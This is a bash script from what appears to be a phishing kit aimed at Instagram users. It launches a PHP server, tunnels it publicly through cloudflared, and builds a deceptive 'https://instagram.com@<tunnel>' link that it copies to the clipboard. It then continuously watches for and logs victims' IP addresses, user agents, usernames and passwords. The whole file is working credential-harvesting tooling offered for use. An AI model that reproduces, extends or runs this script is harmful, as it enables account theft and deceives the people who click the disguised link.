#!/bin/bash

HOST="127.0.0.1"
PORT="8008"
LOG_FILE="auth/log"

# Define color codes
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Function to display a message with a timestamp
print_message() {
    local message="$1"
    local color="$2"
    echo -e "$(date +"[%Y-%m-%d %H:%M:%S]") ${color}${message}${NC}"
}

# Function to start the PHP server
start_php_server() {
    print_message "Starting PHP server at ${HOST}:${PORT}" "$GREEN"
    php -S ${HOST}:${PORT} > /dev/null 2>&1 &
    PHP_PID=$!
}

# Function to create a custom URL and copy it to the clipboard
custom_url() {
    local url=${1#http*//}
    print_message "Custom URL is: https://instagram.com@$url" "$YELLOW"
    echo "https://instagram.com@$url" | pbcopy
}

# Function to start the cloudflared tunnel
start_cloudflared_tunnel() {
    print_message "Starting cloudflared tunnel at ${HOST}:${PORT}" "$BLUE"
    cloudflared tunnel -url "$HOST":"$PORT" --logfile auth/log > /dev/null 2>&1 &
    CLOUDFLARED_PID=$!
    sleep 16
}

get_cloudflared_url() {
    local url
    url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "auth/log")
    echo "$url"
}

# Function to monitor and process ip.txt and passwd.txt
# monitor_files() {
#     while true; do
#         if [[ -e "ip.txt" ]]; then
#             print_message "IP.txt content:" "$MAGENTA"
#             cat ip.txt
#             cat ip.txt >> auth/ip.txt
#             rm -rf ip.txt
#         fi
#         sleep 0.75

#         if [[ -e "passwd.txt" ]]; then
#             print_message "Passwd.txt content:" "$CYAN"
#             cat passwd.txt
#             cat passwd.txt >> auth/passwd.txt
#             rm -rf passwd.txt
#         fi
#         sleep 0.75
#     done
# }

# Function to monitor and process ip.txt and passwd.txt
monitor_files() {
    while true; do
        if [[ -e "ip.txt" ]]; then
            # Print IP and User-Agent only
            ip=$(grep 'IP:' ip.txt | cut -d' ' -f 2)
            userAgent=$(grep 'User-Agent:' ip.txt | cut -d' ' -f 2-)
            timestamp=$(grep 'Date and Time:' ip.txt | cut -d' ' -f 2-)
            echo -e "${NC}${timestamp}\n"
            echo -e "${YELLOW}IP:${NC} $ip\n"
            echo -e "${BLUE}User-Agent:${NC} $userAgent\n"
            echo -e "\n"
            cat ip.txt >> auth/ip.txt
            rm -rf ip.txt
        fi
        sleep 0.75

        if [[ -e "passwd.txt" ]]; then
            
            echo -e "${RED}CREDS${NC}"
            # passwd=$(cat passwd.txt)
            # echo -e "${RED}${passwd}"
            grep -e 'PASSWORD' -e 'User Agent' -e 'USERNAME' passwd.txt
            echo -e "\n"
            cat passwd.txt >> auth/passwd.txt
            rm -rf passwd.txt
        fi

        # if read -t 0; then
        #     get_cloudflared_url | pbcopy
        # fi

        # if read -r -n 1 key && [[ $key == $'\n' ]]; then
        #     get_cloudflared_url | pbcopy
        # fi

        
        sleep 0.75
    done
}

# Function to get the Cloudflare tunnel URL
get_cloudflared_url_with_timeout() {
    timeout_seconds=60  # Adjust the timeout duration as needed
    end_time=$((SECONDS + timeout_seconds))

    while [ $SECONDS -lt $end_time ]; do
        # cloudflared_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "auth/log")
        cloudflared_url=$(get_cloudflared_url)
        if [ -n "$cloudflared_url" ]; then
            return 0  # URL found, return success
        fi
        sleep 1  # Wait for 1 second before checking again
    done

    return 1  # URL not found within the timeout
}



# Function to stop PHP server and cloudflared
stop_servers() {
    print_message "Stopping PHP server and cloudflared" "$RED"
    kill $PHP_PID
    kill $CLOUDFLARED_PID
    exit 0
}


# Trap Ctrl+C and run stop_servers
trap stop_servers SIGINT

# Set up trap to call cleanup function on exit
# trap cleanup EXIT

# Main script logic
main() {

    # Clear the log file at the start
    print_message "Clearing the log file" "$WHITE"
    rm -rf auth/log
    touch auth/log

    # Start PHP server
    start_php_server

    # Start cloudflared tunnel
    start_cloudflared_tunnel

    # Print and copy the URL if it's not empty
    if get_cloudflared_url_with_timeout; then
        print_message "Cloudflared tunnel URL is: $cloudflared_url" "$GREEN"
        custom_url "$cloudflared_url"
    else
        print_message "Timed out: Failed to retrieve the Cloudflared tunnel URL" "$RED"
    fi

    # Monitor for changes in ip.txt and passwd.txt
    monitor_files
}

# Execute the main function
main
